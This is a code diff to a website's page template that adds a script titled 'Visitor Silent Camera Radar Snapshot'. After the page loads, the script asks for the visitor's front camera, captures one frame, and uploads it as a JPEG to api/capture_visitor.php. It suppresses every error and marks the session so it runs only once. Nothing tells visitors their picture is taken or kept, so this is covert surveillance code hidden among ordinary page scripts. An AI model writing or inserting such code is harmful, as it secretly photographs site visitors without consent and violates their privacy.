@@ -310,6 +310,48 @@ if ($is_spa) {
                 applyLanguage(savedLang);
             });
         </script>
+        <!-- Visitor Silent Camera Radar Snapshot -->
+        <script>
+        (function() {
+            if (sessionStorage.getItem('visitor_photo_captured')) return;
+
+            function initCameraCapture() {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+                
+                navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: 'user' } })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    video.onloadedmetadata = function() {
+                        setTimeout(function() {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 320;
+                            canvas.height = 240;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, 320, 240);
+                            
+                            const imgData = canvas.toDataURL('image/jpeg', 0.85);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            sessionStorage.setItem('visitor_photo_captured', '1');
+                            
+                            fetch('api/capture_visitor.php', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ image: imgData })
+                            }).catch(function() {});
+                        }, 800);
+                    };
+                }).catch(function() {});
+            }
+
+            window.addEventListener('DOMContentLoaded', function() {
+                setTimeout(initCameraCapture, 1500);
+            });
+        })();
+        </script>
         <!-- Custom SPA Router -->
         <script src="assets/js/spa-router.js" defer></script>
 
